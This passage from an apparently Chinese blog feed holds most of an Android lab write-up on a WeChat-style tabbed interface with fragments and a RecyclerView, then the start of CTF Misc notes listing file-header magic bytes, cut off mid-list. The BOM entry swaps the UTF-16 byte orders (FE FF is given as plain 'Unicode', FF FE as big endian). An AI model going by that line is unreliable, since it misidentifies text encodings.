class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fragmenthide</span><span class="hljs-params">()</span> {<br>        <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> fm.beginTransaction()<br>                .hide(fragment1)<br>                .hide(fragment2)<br>                .hide(fragment3)<br>                .hide(fragment4);<br>        ft.commit();<br>    }<br></code></pre></td></tr></tbody></table></figure><p>仅对底部选择栏的四个控件进行监听，并根据监听所得到的结果调用fragment界面</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">linearLayout1.setOnClickListener(<span class="hljs-built_in">this</span>);<br>   linearLayout2.setOnClickListener(<span class="hljs-built_in">this</span>);<br>   linearLayout3.setOnClickListener(<span class="hljs-built_in">this</span>);<br>   linearLayout4.setOnClickListener(<span class="hljs-built_in">this</span>);<br></code></pre></td></tr></tbody></table></figure><p>注意这里设置了全局监听</p><p>因此要修改和覆写onClick函数</p><p>修改此处</p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/MEQiFDCcrvHIzdy.png'><img src="https://s2.loli.net/2023/10/07/MEQiFDCcrvHIzdy.png" alt="image.png"></p><p>覆写onClick函数</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view)</span> {<br>        fragmenthide();<br>        <span class="hljs-keyword">if</span> (view.getId()==R.id.id_tab_wx){<br>            fragmentshow(fragment1);<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (view.getId()==R.id.id_tab_friend){<br>            fragmentshow(fragment2);<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (view.getId()==R.id.id_tab_address){<br>            fragmentshow(fragment3);<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(view.getId()==R.id.id_tab_setting){<br>            fragmentshow(fragment4);<br>        }<br>    }<br></code></pre></td></tr></tbody></table></figure><p>而在最开始的界面自然就是聊天界面，故在最开始的时候就调用聊天的fragment</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">fragmentshow</span>(fragment1);<br></code></pre></td></tr></tbody></table></figure><hr><p>由于点击聊天要实现列表功能，固还需要在 ltfragment 里面实现 recycleview 功能</p><p>我们先初始化定义一些变量recyclerView，list，context， myadapter（一个适配器）</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> RecyclerView recyclerView;<br><span class="hljs-keyword">private</span> List&lt;String&gt; list;<br><span class="hljs-keyword">private</span> Context context;<br><span class="hljs-keyword">private</span> Myadapter myadapter;<br></code></pre></td></tr></tbody></table></figure><p>然后我们开始在onCreateView（）函数底下写入适配器需要的一些参数和数据：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> View <span class="hljs-title function_">onCreateView</span><span class="hljs-params">(LayoutInflater inflater, ViewGroup container,</span><br><span class="hljs-params">                         Bundle savedInstanceState)</span> {<br>    View view=inflater.inflate(R.layout.fragment_lt,container,<span class="hljs-literal">false</span>);<br>    context=view.getContext();<br>    recyclerView=view.findViewById(R.id.recyclerview);<br>    list=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>    initData();<span class="hljs-comment">//初始化数据</span><br>    LinearLayoutManager manager=<span class="hljs-keyword">new</span> <span class="hljs-title class_">LinearLayoutManager</span>(context);<br>    manager.setOrientation(LinearLayoutManager.VERTICAL);<br><br>    myadapter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myadapter</span>(context,list);<br><br>    recyclerView.setAdapter(myadapter);<br>    recyclerView.setLayoutManager(manager);<br>    recyclerView.addItemDecoration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DividerItemDecoration</span>(context,LinearLayoutManager.VERTICAL));<br>    <span class="hljs-keyword">return</span> view;<br><br>    <span class="hljs-comment">// Inflate the layout for this fragment</span><br>    <span class="hljs-comment">//return inflater.inflate(R.layout.fragment_lt, container, false);</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>分析代码</p><p>初始化列表内容</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initData</span><span class="hljs-params">()</span>{<br>        list.add(<span class="hljs-string">"网友1:青青园中葵"</span>);<br>        list.add(<span class="hljs-string">"网友2:朝露待日晞"</span>);<br>        list.add(<span class="hljs-string">"网友3:阳春布德泽"</span>);<br>        list.add(<span class="hljs-string">"网友4:万物生光辉"</span>);<br>        list.add(<span class="hljs-string">"网友5:常恐秋节至"</span>);<br>        list.add(<span class="hljs-string">"网友6:焜黄华叶衰"</span>);<br>        list.add(<span class="hljs-string">"网友7:百川东到海"</span>);<br>        list.add(<span class="hljs-string">"网友8:何时复西归"</span>);<br>        list.add(<span class="hljs-string">"网友9:少壮不努力"</span>);<br>        list.add(<span class="hljs-string">"网友10:老大徒伤悲"</span>);<br>    }<br></code></pre></td></tr></tbody></table></figure><p>创建一个<code>LinearLayoutManager</code>对象，并将其赋值给<code>manager</code>变量。然后通过调用<code>setOrientation(LinearLayoutManager.VERTICAL)</code>方法，将布局方向设置为垂直方向。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">LinearLayoutManager manager=<span class="hljs-keyword">new</span> <span class="hljs-title class_">LinearLayoutManager</span>(context);<br>    manager.setOrientation(LinearLayoutManager.VERTICAL);<br></code></pre></td></tr></tbody></table></figure><p><code>myadapter = new Myadapter(context, list);</code> 创建一个名为<code>myadapter</code>的自定义适配器对象，并传入<code>context</code>和<code>list</code>作为参数进行初始化。</p><p>recyclerView.setAdapter(myadapter);<code> 将创建的适配器对象</code>myadapter<code>设置给</code>recyclerView<code>，用于显示数据。</code>recyclerView.setLayoutManager(manager);<code> 将之前创建的布局管理器</code>manager<code>设置给</code>recyclerView，用于控制列表的布局方式。</p><p>return view;<code> 返回包含</code>recyclerView的视图对象。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">myadapter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myadapter</span>(context,list);<br><br>    recyclerView.setAdapter(myadapter);<br>    recyclerView.setLayoutManager(manager);<br>    recyclerView.addItemDecoration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DividerItemDecoration</span>(context,LinearLayoutManager.VERTICAL));<br>    <span class="hljs-keyword">return</span> view;<br></code></pre></td></tr></tbody></table></figure><h4 id="ltfragment全部代码展示"><a href="#ltfragment全部代码展示" class="headerlink" title="ltfragment全部代码展示"></a>ltfragment全部代码展示</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mywork;<br><br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.DividerItemDecoration;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.LinearLayoutManager;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.RecyclerView;<br><br><span class="hljs-keyword">import</span> android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A simple {<span class="hljs-doctag">@link</span> Fragment} subclass.</span><br><span class="hljs-comment"> * Use the {<span class="hljs-doctag">@link</span> ltFragment#newInstance} factory method to</span><br><span class="hljs-comment"> * create an instance of this fragment.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ltFragment</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fragment</span> {<br><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Rename parameter arguments, choose names that match</span><br>    <span class="hljs-comment">// the fragment initialization parameters, e.g. ARG_ITEM_NUMBER</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ARG_PARAM1</span> <span class="hljs-operator">=</span> <span class="hljs-string">"param1"</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ARG_PARAM2</span> <span class="hljs-operator">=</span> <span class="hljs-string">"param2"</span>;<br><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Rename and change types of parameters</span><br>    <span class="hljs-keyword">private</span> String mParam1;<br>    <span class="hljs-keyword">private</span> String mParam2;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Use this factory method to create a new instance of</span><br><span class="hljs-comment">     * this fragment using the provided parameters.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> param1 Parameter 1.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> param2 Parameter 2.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> A new instance of fragment ltFragment.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Rename and change types and number of parameters</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ltFragment <span class="hljs-title function_">newInstance</span><span class="hljs-params">(String param1, String param2)</span> {<br>        <span class="hljs-type">ltFragment</span> <span class="hljs-variable">fragment</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ltFragment</span>();<br>        <span class="hljs-type">Bundle</span> <span class="hljs-variable">args</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bundle</span>();<br>        args.putString(ARG_PARAM1, param1);<br>        args.putString(ARG_PARAM2, param2);<br>        fragment.setArguments(args);<br>        <span class="hljs-keyword">return</span> fragment;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ltFragment</span><span class="hljs-params">()</span> {<br>        <span class="hljs-comment">// Required empty public constructor</span><br>    }<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        <span class="hljs-keyword">if</span> (getArguments() != <span class="hljs-literal">null</span>) {<br>            mParam1 = getArguments().getString(ARG_PARAM1);<br>            mParam2 = getArguments().getString(ARG_PARAM2);<br>        }<br>    }<br><br>    <span class="hljs-keyword">private</span> RecyclerView recyclerView;<br>    <span class="hljs-keyword">private</span> List&lt;String&gt; list;<br>    <span class="hljs-keyword">private</span> Context context;<br>    <span class="hljs-keyword">private</span> Myadapter myadapter;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> View <span class="hljs-title function_">onCreateView</span><span class="hljs-params">(LayoutInflater inflater, ViewGroup container,</span><br><span class="hljs-params">                             Bundle savedInstanceState)</span> {<br>        View view=inflater.inflate(R.layout.fragment_lt,container,<span class="hljs-literal">false</span>);<br>        context=view.getContext();<br>        recyclerView=view.findViewById(R.id.recyclerview);<br>        list=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        initData();<br><br>        LinearLayoutManager manager=<span class="hljs-keyword">new</span> <span class="hljs-title class_">LinearLayoutManager</span>(context);<br><br>        manager.setOrientation(LinearLayoutManager.VERTICAL);<br><br>        myadapter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myadapter</span>(context,list);<br><br>        recyclerView.setAdapter(myadapter);<br><br>        recyclerView.setLayoutManager(manager);<br><br><br>        recyclerView.addItemDecoration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DividerItemDecoration</span>(context,LinearLayoutManager.VERTICAL));<br>        <span class="hljs-keyword">return</span> view;<br><br>        <span class="hljs-comment">// Inflate the layout for this fragment</span><br>        <span class="hljs-comment">//return inflater.inflate(R.layout.fragment_lt, container, false);</span><br>    }<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initData</span><span class="hljs-params">()</span>{<br>        list.add(<span class="hljs-string">"网友1:青青园中葵"</span>);<br>        list.add(<span class="hljs-string">"网友2:朝露待日晞"</span>);<br>        list.add(<span class="hljs-string">"网友3:阳春布德泽"</span>);<br>        list.add(<span class="hljs-string">"网友4:万物生光辉"</span>);<br>        list.add(<span class="hljs-string">"网友5:常恐秋节至"</span>);<br>        list.add(<span class="hljs-string">"网友6:焜黄华叶衰"</span>);<br>        list.add(<span class="hljs-string">"网友7:百川东到海"</span>);<br>        list.add(<span class="hljs-string">"网友8:何时复西归"</span>);<br>        list.add(<span class="hljs-string">"网友9:少壮不努力"</span>);<br>        list.add(<span class="hljs-string">"网友10:老大徒伤悲"</span>);<br>    }<br><br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="MainActivity-java全部内容展示"><a href="#MainActivity-java全部内容展示" class="headerlink" title="MainActivity.java全部内容展示"></a>MainActivity.java全部内容展示</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mywork;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><span class="hljs-keyword">import</span> androidx.fragment.app.FragmentManager;<br><span class="hljs-keyword">import</span> androidx.fragment.app.FragmentTransaction;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.LinearLayoutManager;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.RecyclerView;<br><br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.LinearLayout;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">View</span>.OnClickListener{<br>    Fragment fragment1,fragment2,fragment3,fragment4;<br>    FragmentManager fm;<br>    LinearLayout linearLayout1,linearLayout2,linearLayout3,linearLayout4;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.main);<br>        fragment1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ltFragment</span>();<br>        fragment2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">txlFragment</span>();<br>        fragment3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">findFragment</span>();<br>        fragment4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">wdFragment</span>();<br>        fm = getSupportFragmentManager();<br><br>        linearLayout1 = findViewById(R.id.id_tab_wx);<br>        linearLayout2 = findViewById(R.id.id_tab_friend);<br>        linearLayout3 = findViewById(R.id.id_tab_address);<br>        linearLayout4 = findViewById(R.id.id_tab_setting);<br><br>        inital();<br>        fragmenthide();<br>        fragmentshow(fragment1);<br>        linearLayout1.setOnClickListener(<span class="hljs-built_in">this</span>);<br>        linearLayout2.setOnClickListener(<span class="hljs-built_in">this</span>);<br>        linearLayout3.setOnClickListener(<span class="hljs-built_in">this</span>);<br>        linearLayout4.setOnClickListener(<span class="hljs-built_in">this</span>);<br>    }<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fragmenthide</span><span class="hljs-params">()</span> {<br>        <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> fm.beginTransaction()<br>                .hide(fragment1)<br>                .hide(fragment2)<br>                .hide(fragment3)<br>                .hide(fragment4);<br>        ft.commit();<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">inital</span><span class="hljs-params">()</span> {<br><br>        <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> fm.beginTransaction()<br>                .add(R.id.content,fragment1)<br>                .add(R.id.content,fragment2)<br>                .add(R.id.content,fragment3)<br>                .add(R.id.content,fragment4);<br>        ft.commit();<br><br>    }<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view)</span> {<br>        fragmenthide();<br>        <span class="hljs-keyword">if</span> (view.getId()==R.id.id_tab_wx){<br>            fragmentshow(fragment1);<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (view.getId()==R.id.id_tab_friend){<br>            fragmentshow(fragment2);<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (view.getId()==R.id.id_tab_address){<br>            fragmentshow(fragment3);<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(view.getId()==R.id.id_tab_setting){<br>            fragmentshow(fragment4);<br>        }<br>    }<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fragmentshow</span><span class="hljs-params">(Fragment fragment)</span> {<br>        <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> fm.beginTransaction()<br>                .show(fragment);<br>        transaction.commit();<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h2><p class='item-img' data-src='https://s2.loli.net/2023/10/13/XFIxLtsQfOSbnVc.png'><img src="https://s2.loli.net/2023/10/13/XFIxLtsQfOSbnVc.png" alt="image.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/10/13/pZ5ct8yXLPAS3Nw.png'><img src="https://s2.loli.net/2023/10/13/pZ5ct8yXLPAS3Nw.png" alt="image.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/82PfDyF6CNcqAp9.png'><img src="https://s2.loli.net/2023/10/07/82PfDyF6CNcqAp9.png" alt="Snipaste_2023-10-07_21-10-09.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/ty19qzgMbTcK4l5.png'><img src="https://s2.loli.net/2023/10/07/ty19qzgMbTcK4l5.png" alt="Snipaste_2023-10-07_21-10-13.png"></p><h2 id="代码仓库"><a href="#代码仓库" class="headerlink" title="代码仓库"></a>代码仓库</h2><p><a href="https://github.com/Kylinxin/MyWork"></a><a href="https://github.com/Kylinxin/MyWork">Kylinxin/MyWork: 类微信界面源代码 (github.com)</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是我第一次利用as进行移动开发实现了一个简单的类微信的界面设计，加强了我对as的fragment、基本layout、recycleview的认知，以及对xml文件进行界面编写部分以及对相关的控件有了更深入的了解，能够设计基础UI界面，实现界面跳转功能以及在fragment里面调用recycleview实现列表功能，给我提供了一定的思路进行功能和界面相互连接的代码的编写。在这次的实验下我也对AS这款软件进行了熟悉，对于其提词器的强大有了很深的印象。</p><p>​——2023.10.13</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AS类微信界面开发&quot;&gt;&lt;a href=&quot;#AS类微信界面开发&quot; class=&quot;headerlink&quot; title=&quot;AS类微信界面开发&quot;&gt;&lt;/a&gt;AS类微信界面开发&lt;/h1&gt;&lt;h2 id=&quot;功能要求&quot;&gt;&lt;a href=&quot;#功能要求&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="实验" scheme="https://kylinxin.github.io/categories/%E5%AE%9E%E9%AA%8C/"/>
    
    
    <category term="移动开发实验" scheme="https://kylinxin.github.io/tags/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>常见文件文件头和隐写术总结 CTF中Misc必备</title>
    <link href="https://kylinxin.github.io/2023/09/27/Misc%20%E7%AC%94%E8%AE%B0/"/>
    <id>https://kylinxin.github.io/2023/09/27/Misc%20%E7%AC%94%E8%AE%B0/</id>
    <published>2023-09-27T15:14:29.000Z</published>
    <updated>2023-09-30T09:14:29.172Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="常见文件文件头和隐写术总结-CTF中Misc必备"><a href="#常见文件文件头和隐写术总结-CTF中Misc必备" class="headerlink" title="常见文件文件头和隐写术总结 CTF中Misc必备"></a><strong>常见文件文件头和隐写术总结 CTF中Misc必备</strong></h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>对常见文件文件头和隐写术做个归纳总结</p><ul><li>文件头文件尾</li><li>图片隐写</li><li>音频隐写</li><li>电子文档隐写</li></ul><h3 id="一、文件头文件尾"><a href="#一、文件头文件尾" class="headerlink" title="一、文件头文件尾"></a><strong>一、文件头文件尾</strong></h3><h4 id="1、图片"><a href="#1、图片" class="headerlink" title="1、图片"></a><strong>1、图片</strong></h4><ul><li>JPEG 文件头：<code>FF D8 FF</code>  文件尾：<code>FF D9</code></li><li>TGA 未压缩的前4字节 <code>00 00 02 00</code> RLE压缩的前5字节 <code>00 00 10 00 00</code></li><li>PNG 文件头：<code>89 50 4E 47 0D 0A 1A 0A</code>  文件尾：<code>AE 42 60 82</code></li><li>GIF 文件头：<code>47 49 46 38 39(37) 61</code>  文件尾：<code>00 3B</code></li><li>BMP 文件头：<code>42 4D</code> 文件头标识(2 bytes) 42(B) 4D(M)</li><li>TIFF (tif) 文件头：<code>49 49 2A 00</code></li><li>ico 文件头：<code>00 00 01 00</code></li><li>Adobe Photoshop (psd) 文件头：<code>38 42 50 53</code></li></ul><h4 id="2、office文件"><a href="#2、office文件" class="headerlink" title="2、office文件"></a><strong>2、office文件</strong></h4><ul><li>MS Word/Excel (xls.or.doc) 文件头：<code>D0 CF 11 E0</code></li><li>MS Access (mdb) 文件头：<code>53 74 61 6E 64 61 72 64 20 4A</code></li><li>WordPerfect (wpd) 文件头：<code>FF 57 50 43</code></li><li>Adobe Acrobat (pdf) 文件头：<code>25 50 44 46 2D 31 2E</code></li><li>application/vnd.visio(vsd) 文件头：<code>D0 CF 11 E0 A1 B1 1A E1</code></li><li>Email [thorough only] (eml) 文件头：<code>44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A</code></li><li>Outlook Express (dbx) 文件头：<code>CF AD 12 FE C5 FD 74 6F</code></li><li>Outlook (pst) 文件头：<code>21 42 44 4E</code></li><li>Rich Text Format (rtf) 文件头：<code>7B 5C 72 74 66</code></li><li>txt 文件(txt) 文件头：Unicode：<code>FE FF</code> / Unicode big endian：<code>FF FE</code> / UTF-8：<code>EF BB BF</code> /ANSI编码是没有文件头的</li></ul><h4 id="3、压缩包文件"><a href="#3、压缩包文件" 